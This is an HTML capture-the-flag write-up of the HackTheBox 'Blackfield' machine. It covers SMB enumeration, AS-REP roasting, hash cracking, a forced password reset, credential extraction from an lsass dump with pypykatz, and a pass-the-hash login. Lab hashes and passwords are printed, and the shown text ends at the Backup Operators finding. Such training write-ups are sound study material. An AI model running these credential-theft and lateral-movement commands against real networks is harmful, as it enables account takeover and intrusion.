@@ -1,0 +1,1332 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+      
+        <meta name="author" content="Gmrvh">
+      
+      
+        <link rel="canonical" href="https://gmrvh.github.io/ctf-writeups/htb/blackfield/">
+      
+      
+        <link rel="prev" href="../cascade/">
+      
+      
+        <link rel="next" href="../soccer/">
+      
+      
+      <link rel="icon" href="../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.6.12">
+    
+    
+      
+        <title>Blackfield - Gmvrh</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../assets/stylesheets/main.2afb09e1.min.css">
+      
+        
+        <link rel="stylesheet" href="../../assets/stylesheets/palette.06af60db.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+      <link rel="stylesheet" href="../../stylesheets/extra.css">
+    
+    <script>__md_scope=new URL("../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+    
+  </head>
+  
+  
+    
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="slate" data-md-color-primary="black" data-md-color-accent="white">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#blackfield-writeup" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+  
+
+<header class="md-header md-header--shadow" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href="../.." title="Gmvrh" class="md-header__button md-logo" aria-label="Gmvrh" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            Gmvrh
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              Blackfield
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+    
+    
+    
+    
+      
+      
+        <label class="md-header__button md-icon" for="__search">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        </label>
+        <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Search">
+        
+        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+        <div class="md-search__suggest" data-md-component="search-suggest"></div>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+      
+    
+    
+      <div class="md-header__source">
+        <a href="https://github.com/gmrvh/ctf-writeups" title="Go to repository" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 6.7.2 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M439.55 236.05 244 40.45a28.87 28.87 0 0 0-40.81 0l-40.66 40.63 51.52 51.52c27.06-9.14 52.68 16.77 43.39 43.68l49.66 49.66c34.23-11.8 61.18 31 35.47 56.69-26.49 26.49-70.21-2.87-56-37.34L240.22 199v121.85c25.3 12.54 22.26 41.85 9.08 55a34.34 34.34 0 0 1-48.55 0c-17.57-17.6-11.07-46.91 11.25-56v-123c-20.8-8.51-24.6-30.74-18.64-45L142.57 101 8.45 235.14a28.86 28.86 0 0 0 0 40.81l195.61 195.6a28.86 28.86 0 0 0 40.8 0l194.69-194.69a28.86 28.86 0 0 0 0-40.81"/></svg>
+  </div>
+  <div class="md-source__repository">
+    GitHub
+  </div>
+</a>
+      </div>
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+
+  
+
+<nav class="md-nav md-nav--primary md-nav--integrated" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../.." title="Gmvrh" class="md-nav__button md-logo" aria-label="Gmvrh" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    Gmvrh
+  </label>
+  
+    <div class="md-nav__source">
+      <a href="https://github.com/gmrvh/ctf-writeups" title="Go to repository" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 6.7.2 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M439.55 236.05 244 40.45a28.87 28.87 0 0 0-40.81 0l-40.66 40.63 51.52 51.52c27.06-9.14 52.68 16.77 43.39 43.68l49.66 49.66c34.23-11.8 61.18 31 35.47 56.69-26.49 26.49-70.21-2.87-56-37.34L240.22 199v121.85c25.3 12.54 22.26 41.85 9.08 55a34.34 34.34 0 0 1-48.55 0c-17.57-17.6-11.07-46.91 11.25-56v-123c-20.8-8.51-24.6-30.74-18.64-45L142.57 101 8.45 235.14a28.86 28.86 0 0 0 0 40.81l195.61 195.6a28.86 28.86 0 0 0 40.8 0l194.69-194.69a28.86 28.86 0 0 0 0-40.81"/></svg>
+  </div>
+  <div class="md-source__repository">
+    GitHub
+  </div>
+</a>
+    </div>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../.." class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Home
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+    
+  
+  
+  
+    
+    
+    
+    
+      
+        
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    CTF Writeups
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_2">
+            <span class="md-nav__icon md-icon"></span>
+            CTF Writeups
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../web/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Overview
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    
+    
+    
+    
+      
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_2" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_2_2" id="__nav_2_2_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    HackTheBox
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_2_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_2_2">
+            <span class="md-nav__icon md-icon"></span>
+            HackTheBox
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../cypher/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Cypher
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../eureka/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Eureka
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../monteverde/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Monteverde
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../sauna/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Sauna
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../timelapse/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Timelapse
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../forest/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Forest
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../cascade/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Cascade
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  
+  <span class="md-ellipsis">
+    Blackfield
+    
+  </span>
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        
+  
+  
+  <span class="md-ellipsis">
+    Blackfield
+    
+  </span>
+  
+
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#initial-enumeration" class="md-nav__link">
+    <span class="md-ellipsis">
+      Initial Enumeration
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Initial Enumeration">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#port-scanning" class="md-nav__link">
+    <span class="md-ellipsis">
+      Port Scanning
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#domain-information" class="md-nav__link">
+    <span class="md-ellipsis">
+      Domain Information
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#smb-enumeration" class="md-nav__link">
+    <span class="md-ellipsis">
+      SMB Enumeration
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#gaining-initial-access" class="md-nav__link">
+    <span class="md-ellipsis">
+      Gaining Initial Access
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Gaining Initial Access">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#as-rep-roasting" class="md-nav__link">
+    <span class="md-ellipsis">
+      AS-REP Roasting
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#password-cracking" class="md-nav__link">
+    <span class="md-ellipsis">
+      Password Cracking
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#bloodhound-enumeration" class="md-nav__link">
+    <span class="md-ellipsis">
+      BloodHound Enumeration
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#lateral-movement" class="md-nav__link">
+    <span class="md-ellipsis">
+      Lateral Movement
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Lateral Movement">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#password-reset" class="md-nav__link">
+    <span class="md-ellipsis">
+      Password Reset
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#share-enumeration" class="md-nav__link">
+    <span class="md-ellipsis">
+      Share Enumeration
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#memory-dump-analysis" class="md-nav__link">
+    <span class="md-ellipsis">
+      Memory Dump Analysis
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#privilege-escalation" class="md-nav__link">
+    <span class="md-ellipsis">
+      Privilege Escalation
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Privilege Escalation">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#windows-backup-privileges" class="md-nav__link">
+    <span class="md-ellipsis">
+      Windows Backup Privileges
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#setting-up-smb-server" class="md-nav__link">
+    <span class="md-ellipsis">
+      Setting Up SMB Server
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#domain-controller-backup" class="md-nav__link">
+    <span class="md-ellipsis">
+      Domain Controller Backup
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#registry-hive-extraction" class="md-nav__link">
+    <span class="md-ellipsis">
+      Registry Hive Extraction
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#extracting-domain-hashes" class="md-nav__link">
+    <span class="md-ellipsis">
+      Extracting Domain Hashes
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#domain-admin-access" class="md-nav__link">
+    <span class="md-ellipsis">
+      Domain Admin Access
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../soccer/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Soccer
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../jeeves/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Jeeves
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_3" >
+        
+          
+          <label class="md-nav__link" for="__nav_2_3" id="__nav_2_3_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    ProvingGrounds
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2_3">
+            <span class="md-nav__icon md-icon"></span>
+            ProvingGrounds
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../pg/dvr4/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    DVR4
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../pg/shenzi/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Shenzi
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../pg/nora/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Nora
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../pg/catto/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Catto
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../pg/bottleup/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Bottleup
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../pg/resourced/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Resourced
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../pg/confusion/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Confusion
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../pg/clue/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Clue
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../pg/flu/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Flu
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../pg/zipper/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Zipper
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../pg/zenphoto/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    ZenPhoto
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+
+  
+  
+
+
+<h1 id="blackfield-writeup">Blackfield - Writeup</h1>
+<h2 id="initial-enumeration">Initial Enumeration</h2>
+<h3 id="port-scanning">Port Scanning</h3>
+<p>A comprehensive port scan revealed standard Active Directory services:
+<div class="highlight"><pre><span></span><code>PORT     STATE SERVICE       VERSION
+53/tcp   open  domain        Simple DNS Plus
+88/tcp   open  kerberos-sec  Microsoft Windows Kerberos
+135/tcp  open  msrpc         Microsoft Windows RPC
+389/tcp  open  ldap          Microsoft Windows Active Directory LDAP
+445/tcp  open  microsoft-ds?
+593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+3268/tcp open  ldap          Microsoft Windows Active Directory LDAP
+</code></pre></div></p>
+<h3 id="domain-information">Domain Information</h3>
+<p>From the scan results, I identified domain information:
+<div class="highlight"><pre><span></span><code>Domain: BLACKFIELD.local
+Domain Controller: DC01.BLACKFIELD.local
+</code></pre></div></p>
+<h3 id="smb-enumeration">SMB Enumeration</h3>
+<p>I checked for SMB access with null and guest authentication:
+<div class="highlight"><pre><span></span><code>crackmapexec<span class="w"> </span>smb<span class="w"> </span><span class="m">10</span>.129.229.17<span class="w"> </span>-u<span class="w"> </span><span class="s1">&#39;&#39;</span><span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;&#39;</span>
+crackmapexec<span class="w"> </span>smb<span class="w"> </span><span class="m">10</span>.129.229.17<span class="w"> </span>-u<span class="w"> </span><span class="s1">&#39;Guest&#39;</span><span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;&#39;</span>
+</code></pre></div></p>
+<p>Guest authentication revealed access to a "profiles$" share:
+<div class="highlight"><pre><span></span><code>smbclient<span class="w"> </span>//10.129.229.17/profiles$<span class="w"> </span>-U<span class="w"> </span>Guest
+</code></pre></div></p>
+<p>This share contained numerous directories named after potential usernames. I extracted these usernames for further attacks:
+<div class="highlight"><pre><span></span><code>smbclient<span class="w"> </span>//10.129.229.17/profiles$<span class="w"> </span>-U<span class="w"> </span>Guest<span class="w"> </span>-c<span class="w"> </span><span class="s2">&quot;ls&quot;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>awk<span class="w"> </span><span class="s1">&#39;{print $1}&#39;</span><span class="w"> </span>&gt;<span class="w"> </span>users.txt
+</code></pre></div></p>
+<h2 id="gaining-initial-access">Gaining Initial Access</h2>
+<h3 id="as-rep-roasting">AS-REP Roasting</h3>
+<p>With the user list in hand, I attempted AS-REP Roasting to identify users with Kerberos pre-authentication disabled:
+<div class="highlight"><pre><span></span><code>GetNPUsers.py<span class="w"> </span>BLACKFIELD.LOCAL/<span class="w"> </span>-usersfile<span class="w"> </span>users.txt<span class="w"> </span>-dc-ip<span class="w"> </span><span class="m">10</span>.129.229.17<span class="w"> </span>-no-pass
+</code></pre></div></p>
+<p>This revealed a hash for the "support" user:
+<div class="highlight"><pre><span></span><code>$krb5asrep$23$support@BLACKFIELD.LOCAL:b3db2df37b67a1b8ae5639d98bacaf27$e1203eeede294e058990c0ab70ef72087b38608fbfd36cbbab4416999f92e4b84b44ec41bf4cafdaadeeb394f4183625541ebebf4ece454878392e9f98e19014528f687e6c98edc578c6c99bb35b37cd582d17b423368cf1c6e223495ab2a39158a2d34927280532c5dec7b00c01b058a2cea204e1a96c81e18cb78feef82ad51cc58a596c95b10c8ad889665a3f61b4381fc63387d52c957e2f2d7bf1178a64a3f5e4cd2a7c1513e1c26d8fe809f6693af17fad6749cd896967ff288bcf9d7202f28fb00716357fa483ec2ace48204fcdc9b002cdb32806e85fb33405e8c501dfc79734d5745cb973f798b4674c1de93e5ab9ad
+</code></pre></div></p>
+<h3 id="password-cracking">Password Cracking</h3>
+<p>I used Hashcat to crack the hash:
+<div class="highlight"><pre><span></span><code>hashcat<span class="w"> </span>-m<span class="w"> </span><span class="m">18200</span><span class="w"> </span>hash.txt<span class="w"> </span>/usr/share/wordlists/rockyou.txt
+</code></pre></div></p>
+<p>This revealed valid credentials:
+- <strong>Username</strong>: support
+- <strong>Password</strong>: #00^BlackKnight</p>
+<h3 id="bloodhound-enumeration">BloodHound Enumeration</h3>
+<p>I used BloodHound to map the domain and identify attack paths:
+<div class="highlight"><pre><span></span><code>bloodhound-python<span class="w"> </span>-c<span class="w"> </span>All<span class="w"> </span>-u<span class="w"> </span>support<span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;#00^BlackKnight&#39;</span><span class="w"> </span>-d<span class="w"> </span>BLACKFIELD.LOCAL<span class="w"> </span>-dc<span class="w"> </span>DC01.BLACKFIELD.LOCAL<span class="w"> </span>-ns<span class="w"> </span><span class="m">10</span>.129.229.17
+</code></pre></div></p>
+<p>Analysis of the BloodHound data revealed that the "support" user had the ability to change passwords for the "audit2020" user.</p>
+<h2 id="lateral-movement">Lateral Movement</h2>
+<h3 id="password-reset">Password Reset</h3>
+<p>I used the support account's privileges to reset the password for audit2020:
+<div class="highlight"><pre><span></span><code>net<span class="w"> </span>rpc<span class="w"> </span>password<span class="w"> </span><span class="s2">&quot;audit2020&quot;</span><span class="w"> </span><span class="s2">&quot;Dolphin1&quot;</span><span class="w"> </span>-U<span class="w"> </span><span class="s2">&quot;blackfield.local&quot;</span>/<span class="s2">&quot;support&quot;</span>%<span class="s2">&quot;#00^BlackKnight&quot;</span><span class="w"> </span>-S<span class="w"> </span><span class="s2">&quot;dc01.blackfield.local&quot;</span>
+</code></pre></div></p>
+<h3 id="share-enumeration">Share Enumeration</h3>
+<p>With the new credentials, I enumerated accessible shares:
+<div class="highlight"><pre><span></span><code>crackmapexec<span class="w"> </span>smb<span class="w"> </span><span class="m">10</span>.129.229.17<span class="w"> </span>-u<span class="w"> </span><span class="s1">&#39;audit2020&#39;</span><span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;Dolphin1&#39;</span><span class="w"> </span>--shares
+</code></pre></div></p>
+<p>This revealed several shares, including an interesting "forensic" share:
+<div class="highlight"><pre><span></span><code>SMB         10.129.229.17   445    DC01             forensic        READ            Forensic / Audit share.
+</code></pre></div></p>
+<h3 id="memory-dump-analysis">Memory Dump Analysis</h3>
+<p>I connected to the forensic share and found a memory dump file:
+<div class="highlight"><pre><span></span><code>smbclient<span class="w"> </span>//10.129.229.17/forensic<span class="w"> </span>-U<span class="w"> </span><span class="s1">&#39;audit2020%Dolphin1&#39;</span>
+get<span class="w"> </span>lsass.DMP
+</code></pre></div></p>
+<p>I analyzed the memory dump using pypykatz:
+<div class="highlight"><pre><span></span><code>pypykatz<span class="w"> </span>lsa<span class="w"> </span>minidump<span class="w"> </span>lsass.DMP
+</code></pre></div></p>
+<p>This revealed credentials for the "svc_backup" user:
+- <strong>Username</strong>: svc_backup
+- <strong>NT Hash</strong>: 9658d1d1dcd9250115e2205d9f48400d</p>
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+<h3 id="windows-backup-privileges">Windows Backup Privileges</h3>
+<p>I connected to the target using the svc_backup account with pass-the-hash:
+<div class="highlight"><pre><span></span><code>evil-winrm<span class="w"> </span>-H<span class="w"> </span>9658d1d1dcd9250115e2205d9f48400d<span class="w"> </span>-u<span class="w"> </span><span class="s1">&#39;svc_backup&#39;</span><span class="w"> </span>-i<span class="w"> </span><span class="m">10</span>.129.229.17
+</code></pre></div></p>
+<p>Through BloodHound analysis, I discovered that svc_backup was a member of the "Backup Operators" group, which has significant privileges including the ability to read any file on the system regardless of ACLs.</p>
